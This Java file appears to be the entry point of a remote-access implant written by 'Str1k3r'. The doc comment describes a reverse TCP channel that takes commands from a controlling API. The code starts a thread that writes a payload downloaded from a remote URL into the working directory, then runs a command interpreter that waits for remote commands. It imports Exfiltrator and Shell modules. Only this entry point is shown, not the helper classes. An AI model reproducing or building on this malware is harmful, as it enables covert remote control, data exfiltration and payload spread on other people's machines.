import modules.auxiliary.Endpoint;
import modules.auxiliary.Manager;
import modules.auxiliary.ModuleConfig;
import modules.core.CmdInterpreter;
import modules.core.Exfiltrator;
import modules.auxiliary.Shell;
import modules.core.MediaWriter;

import java.util.Scanner;

/**
    Entry point. Responsible for initial communication with API (reverse tcp), and subsequent receipt
    of commands from the API. Inverse logic, by using HttpResponse to receive commands and
    HttpRequest to send results.

    @version 1.0
    @author Str1k3r
*/
public class Main {

    public static void main(String[] args) {
        launch();
    }


    private static void launch() {
        Manager manager = Manager.getInstance();

        // 1 - MediaWriter
        ModuleConfig.CopyConfig config = new ModuleConfig.CopyConfig()
                .payloadURL(Endpoint.payload().toString())
                .startPath("./")
                .isRecursive(false);

        MediaWriter mediaWriter = MediaWriter.getInstance(config);
        manager.executeThread(mediaWriter);

        // 2 - Command Interpreter
        CmdInterpreter interpreter = CmdInterpreter.getInstance();
        interpreter.listen();
    }
}
